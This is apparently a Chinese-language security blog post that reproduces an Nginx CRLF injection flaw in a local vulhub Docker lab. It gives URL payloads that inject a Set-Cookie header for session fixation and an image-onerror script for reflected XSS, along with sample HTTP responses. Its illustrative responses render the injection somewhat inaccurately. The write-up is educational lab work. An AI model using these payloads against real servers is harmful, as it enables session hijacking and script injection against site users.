---
title: Nginx中间件漏洞之CRLF注入
tags: 
  - Nginx
  - 中间件漏洞
  - web安全
categories: 中间件安全
keywords: 'web安全,Nginx,中间件漏洞'
description: Nginx中间件漏洞之CRLF注入
cover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631
date: 2021-08-05 09:45:41
---

<meta name="referrer" content="no-referrer"/>

# 0x01 复现环境

本地搭建docker+vulhub
```shell
cd vulhub-master 
cd nginx/insecure-configuration 
docker-compose up -d
```


# 0x02 漏洞复现
8080所在位置为CRLF注入漏洞
1、修改burp抓取数据包的端口为8089
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763746667-a4af1ae9-7a82-4633-a3ee-b6f720d0c16f.png#align=left&display=inline&height=265&margin=%5Bobject%2Object%5D&name=image.png&originHeight=530&originWidth=2222&size=96535&status=done&style=none&width=1111)
2、访问[http://127.0.0.1/](https://127.0.0.1/)，页面会强制跳转到https://127.0.0.1，数据包如下
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763827997-81b931c7-332b-473d-9efa-3617874e6fe0.png#align=left&display=inline&height=463&margin=%5Bobject%2Object%5D&name=image.png&originHeight=926&originWidth=1804&size=210325&status=done&style=none&width=902)
3、注意这里的Location参数值为即将要跳转的路径，下面更换访问路径如下：

```
http://127.0.0.1:8080/%0a%0dSet-Cookie:%20a=1
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763968311-2d1b4808-365e-4d3d-9562-00482672aa60.png#align=left&display=inline&height=537&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1074&originWidth=1818&size=249528&status=done&style=none&width=909)
可以看到成功注入了Set-Cookie头，这里成功为攻击者设置了一个cookie，造成了**会话固定**漏洞。

4、CRLF注入当然不仅能造成会话固定，当换行多一个的时候，便能够将内容输入到页面上，这里很明显到一个反射型XSS漏洞，payload如下：
```
http://127.0.0.1:8080/%0D%0ASet-Cookie:%20ajie123%0d%0a%0d%0a<img src=1 onerror=alert(1)>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626764298479-7bd1f1a8-6417-45f1-9116-ffc891d50f84.png#align=left&display=inline&height=480&margin=%5Bobject%2Object%5D&name=image.png&originHeight=960&originWidth=1800&size=237321&status=done&style=none&width=900)
# 0x03 漏洞分析
CRLF即回车换行，用字节来表示的话是\r\n，URL中就是%0D%0A，在http的header头部字段中，每一个参数后会自动跟上一个\r\n，也就是说如果没有正确识别我们输入的回车换行字段时，便可以通过回车换行使页面显示我们需要的数据。

即如下情况:
正常的返回包
```http
HTTP/1.1 302 Moved Temporarily[\r\n]
Server: nginx/1.13.0[\r\n]
Date: Tue, 20 Jul 2021 06:57:29 GMT[\r\n]
Content-Type: text/html[\r\n]
Content-Length: 161[\r\n]
Connection: close[\r\n]
Location: https://127.0.0.1/[\r\n]
```
设置cookie的返回包：
```http
HTTP/1.1 302 Moved Temporarily[\r\n]
Server: nginx/1.13.0[\r\n]
Date: Tue, 20 Jul 2021 06:57:29 GMT[\r\n]
Content-Type: text/html[\r\n]
Content-Length: 161[\r\n]
Connection: close[\r\n]
Location: https://127.0.0.1/[\r\n][\r\n]%0a%0dSet-Cookie:%20a=1
```
设置xss的返回包：
```http
HTTP/1.1 302 Moved Temporarily[\r\n]
Server: nginx/1.13.0[\r\n]
Date: Tue, 20 Jul 2021 06:57:29 GMT[\r\n]
Content-Type: text/html[\r\n]
Content-Length: 161[\r\n]
Connection: close[\r\n]
Location: https://127.0.0.1/[\r\n][\r\n]%0a%0dSet-Cookie:%20a=1[\r\n][\r\n]<img src=1 onerror=alert(1)>
```

